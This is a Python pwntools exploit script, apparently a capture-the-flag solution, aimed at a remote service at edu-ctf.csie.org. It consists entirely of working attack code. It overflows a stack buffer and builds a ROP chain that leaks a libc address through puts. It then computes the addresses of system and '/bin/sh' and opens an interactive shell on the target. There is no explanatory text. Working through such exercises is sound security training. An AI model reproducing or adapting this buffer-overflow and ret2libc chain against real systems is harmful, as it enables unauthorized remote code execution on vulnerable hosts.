from pwn import *

host = 'edu-ctf.csie.org'
port = 10175

r = remote(host, port)

context.arch = 'amd64'
l = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

pop_rdi = 0x0000000000400733
pop_rsi_pop_15 = 0x0000000000400731
bss = 0x00601000
lib_start_main_got = 0x0000000000600ff0
ret = 0x0000000000400506
put_plt = 0x0000000000400520
get_plt = 0x0000000000400530
main_plt = 0x0000000000400698       #objdump -d 

p = b'a' * (0x30 + 8)
p += p64(pop_rdi)
p += p64(lib_start_main_got)
p += p64(put_plt)
p += p64(main_plt)

r.sendlineafter(':D', p )

r.recvline()
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x0000000000021ab0
print('%s' %hex(libc_base))

bin_sh = next(l.search('/bin/sh'))
bin_sh = libc_base + bin_sh

sys_offset = 0x000000000004f440
system_address = libc_base + sys_offset
print('%s' %hex(system_address))



p = b'a' * (0x30 + 8)
p += p64(ret)
p += p64(pop_rdi)
p += p64(bin_sh)   #binsh address
p += p64(system_address)

r.sendlineafter(':D', p )

r.interactive()
